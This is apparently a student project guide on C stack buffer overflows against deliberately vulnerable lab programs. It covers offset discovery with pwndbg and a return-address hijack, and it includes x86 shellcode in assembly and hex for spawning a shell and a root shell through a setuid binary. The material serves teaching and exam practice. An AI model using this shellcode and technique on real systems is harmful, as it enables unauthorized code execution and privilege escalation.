# C Buffer Overflow guide

# Introduction

C buffer overflow project for Security exam.

Makefile CFLAG are ```-std=c99``` (Standard C 99) since it allows gets (unsafe function),


### What do these flags do?

1. **`-fno-stack-protector`**  
   Disables the stack protector (Stack Smashing Protector, SSP).  
   Normally, the compiler inserts extra code to detect buffer overflows and prevent exploitation. Using this flag removes that protection, making it easier to cause and exploit buffer overflows.

2. **`-no-pie`**  
   Disables Position Independent Executable (PIE) generation.  
   Modern programs are usually compiled as PIE to support ASLR (Address Space Layout Randomization), which randomizes memory addresses every run. Disabling PIE makes the executable have fixed addresses, making function and variable addresses predictable and exploitation easier.

3. **`-z execstack`**  
   Allows execution of code on the stack (exec stack).  
   Normally, the stack is marked non-executable (NX bit) to prevent executing injected code on the stack. This flag removes that protection, allowing code execution directly from the stack.

---

**In short:** These flags make the program much more vulnerable and permissive to buffer overflow exploits, useful for exercises or CTFs (Capture The Flag) where you want to practice exploitation techniques.



# Not checked (1)
Before diving into more complex examples of buffer overflow attacks, let’s begin with a brief introduction using the vulnerable program `not-checked`.
In simple terms, buffer overflow vulnerabilities occur when a program stores unchecked input into a buffer using memory-unsafe functions such as `gets` or `strcpy`.
These functions do not verify whether the input fits within the allocated space of the destination buffer.
As a result, if the input exceeds the buffer size, an overflow occurs: instead of raising an error, these functions overwrite adjacent memory locations, potentially leading to unintended or malicious behavior.

After compiling `notchecked.c` and generating the executable in the `bin/` folder, we can use GDB to analyze what happens during execution.

First, let’s provide a safe input like AAAA, which fits entirely within the buffer.
The image below shows the contents of the stack immediately after the execution of `strcpy`.

![notchecked 3](docs/images/notchecked%203.jpeg)

- The green square highlights the portion of the stack where our buffer is stored. As expected, it is partially filled with 'A' characters.

- The grey square represents the space between the buffer and the saved base pointer ($ebp), shown in orange.

- Finally, in the red box there is the return address of the main function.

By performing a simple calculation, we can determine that an input of at least 40 bytes is required to overwrite the return address.
Let’s use Python to generate such an input and feed it to `notchecked` to observe the result.

![notchecked 2](docs/images/notchecked%202.jpeg)

As shown, both the return address and the saved base pointer have been overwritten!

![notchecked 1](docs/images/notchecked%201.jpeg)

As an inevitable consequence, the program crashes. However, this kind of vulnerability can be exploited for far more powerful attacks as we'll see.


# Double call (2)

Having covered the basics of buffer overflow attacks and why they occur, let’s now explore how this vulnerability can allow an attacker to alter the flow of a program.

To demonstrate this, we’ve created a simple C program called `doublecall`, which contains a vulnerable function of the same name.
The goal of this basic attack is to redirect the program's execution by forcing it to call the vulnerable function twice.
We aim to find an input size that overwrites the return address of the `doubleCall` stack frame, and then replace it — instead of pointing back to `main()`, we’ll set it to the address of `doubleCall` itself.

Start the program and provide increasingly large inputs until it crashes due to a corrupted return address.
With an input of `24 bytes`, we encounter a segmentation fault.
However, the hexdump shows only 'A's — we still don’t know exactly where the return address is located in our input.
Since the program runs on a **32-bit machine**, each address is **4 bytes long**.
We can craft a distinguishable 24-byte input to identify the return address position.
Executing the program with the input `AAAABBBBCCCCDDDDEEEEFFFF`, will result in the following stack memory dump:

![doublecall 1](docs/images/doublecall%201.jpeg)

Continuing the execution will result in: `Segmentation fault at address 0x46464646`\
That value corresponds to the characters 'FFFF' in ASCII (0x46 = 'F'), meaning the return address was overwritten with 'F's.\
**Bingo!** We now know that placing an address immediately after the 'EEEE' block will overwrite the return address.

Assuming the address of `doubleCall` from the disassembly is `0x080491c0`, we need to place it at the right position in little-endian format.

![doublecall 2](docs/images/doublecall%202.jpeg)

We can craft the payload like this: `perl -e 'print pack("H*", "4141414141414141414141414141414141414141c0910408");'`\
As shown in the image below, the payload correctly overwrites the return address with the address of `doubleCall` (in little-endian).

![doublecall 3](docs/images/doublecall%203.jpeg)

As a result, the function is executed again, proving that we successfully hijacked the control flow.

![doublecall 4](docs/images/doublecall%204.jpeg)

# Code Exec (3)

Let's start with something interesting: in this example, we will attempt an attack that aims to force code execution on the target machine  
through the vulnerable program `codeexec`!  
We will proceed step by step, assuming you have assimilated the concepts from the previous two examples.

### (1) Reach the return address value!

As you can see from the source code, `codeexec` has a vulnerable buffer of size **500**.  
To easily determine the return address offset, we can start with a **discovery payload** of the same size.

To quickly generate this payload, we can use the GDB plugin **pwndbg**, which provides many functions specifically crafted for reverse engineering.  
Once inside the GDB shell with `pwndbg` installed, type: `cyclic -n 4 500 ./docs/codeexec/discovery_payload.txt`.\
Now run: `./bin/codeexec $(cat ./docs/codeexec/discovery_payload.txt)`.\
As expected, our input has filled the buffer completely **without crashing** the program.\
Let’s try again with a payload of size **1024**.

![codeexec 1](docs/images/codeexec%201.jpeg)\

This time, we’ve overflowed the buffer and caused the program to crash.
Looking at the segfault error, we see that the return address has been overwritten with the value: `0x66616164 = daaf`.\
`cyclic` allows us to determine the exact offset of the overwritten value by simply running: `cyclic -o 0x66616164`.

![codeexec 2](docs/images/codeexec%202.jpeg)\

Success — we’ve found the offset of **512**!

### (2) Crafting the payload

Before proceeding, let’s quickly review the typical components of a buffer overflow payload:

1. The **shellcode**\
a small piece of code used to exploit the program, usually to spawn a shell.
2. The **nop sled**\
a long sequence of NOP (no operation) instructions placed before the shellcode.
It increases the chances of a successful jump by allowing the return address to land anywhere within the sled.
3. The **return address**\
this overwrites the original return address.
It should point somewhere inside the NOP sled, to ensure the CPU will eventually reach the shellcode.

In our case, we have **512** bytes available to store the **shellcode** + the **nop sled** that for the following shellcode is plenty of space given that our shellcode is only 22 bytes long.\
Using the [syscall table reference](https://x86.syscall.sh/), we have written a simple shellcode that is the equivalent of run `execve("/bin/bash",{NULL},{NULL})` in a machine with intel_x86 architecture.

```c
xor eax,eax // generate a null value without using \x00 (bad character)
cdq // cdq extend the sign of the value in $eax in $edx => zeroing $edx
push eax // push the null value in the stack as termination character of "/bin//sh"
push 0x68732f2f // push "hs//" (//sh in little-endian)
push 0x6e69622f // push "nib/"
mov ebx,esp // $ebx contain the pointer to the first parameter of execve => $esp points to "/bin//sh"  
mov ecx,eax // $ecx contain the pointer to the second parameter of execve => $eax is null
sub eax,-0x0b // $eax contain the syscall number, use the subtraction to avoid \x0b (possible bad character)
int 0x80 // trigger the syscall
```

Let's proceed compiling the assembly file and extract the shellcode in hex format: 
1. make the object file using: `nasm -f elf32 ./utils/shellcode1.asm -o ./obj/shellcode.o`
2. using the tool `bin2shell` extract the shellcode: `./utils/bin2shell.sh ./obj/shellcode.o`
3. we finally get our shellcode: `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x83\xe8\xf5\xcd\x80`

Now that we have all we need, lets craft the payload:
1. nop sled, length: $offset - len(shellcode) = 512B - 23B = 489B$
2. shellcode, length: 23B
3. return address that we get from the dump of the stack, length: 8B 

Firstly we need to run the payload without a valid return address to discover it, 
so after placing `AAAA` in the return address of the payload run: `codeexec $(cat ./docs/codeexec/payload.bin)`.\
Now we need to find a return address that falls in the middle of the **nop sled**.

![codeexec 3](docs/images/codeexec%203.jpeg)\

The program is crashed, let's check the hexdump of the stack.

![codeexec 4](docs/images/codeexec%204.jpeg)\

As you can see the nop sled start around the address `0xbffff134` and terminates approximately at `0xbffff31c`, our payload need to have a return address between these two.
Our choice is `0xbffff304` we only care to not choose an address with bad characters.
Insert the address in little-endian form in the `gen_payload.py` script, generate the payload and run the program!

![codeexec 5](docs/images/codeexec%205.jpeg)\

Success — we’ve spawned a shell!

### (3) Adjusting the shellcode to gain more privileges

Now we have access to a shell, however it have the privileges of the user "victim" who is the user that run the application.
Unfortunately, victim have very few privileges, and for example we may want, gain the access to `/etc/shadow` to read all the users encrypted passwords.
Analyzing the environment i have found that the owner of the application is **root**, and the `s` flag is set in the permissions of that folder.

![codeexec 6](docs/images/codeexec%206.jpeg)

The `s` flag in owner file permissions allows the program to be executed as the owner even if "victim" starts it.
So let's modify the previous shellcode to exploit this system administrator mistake.

```Assembly
// run setuid(0)
xor eax, eax // zeroing $eax
mov ebx, eax // uid = 0 is the root uid 
mov al, 0x17 // setting syscall number
int 0x80 // trigger the syscall

// run setgid(0)
// id = 0 is the sudoers id (already in ebx)
xor eax, eax // zeroing $eax
mov al, 0x2e // setting syscall number
int 0x80 // trigger the syscall

// execve("/bin//sh", NULL, NULL)
xor eax,eax
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
mov ecx,eax
sub eax,-0x0b
int 0x80
```

Now, proceed like before generate the payload and provide it as input to the program.

![codeexec 7](docs/images/codeexec%207.jpeg)

Success — we’ve spawned a root shell!





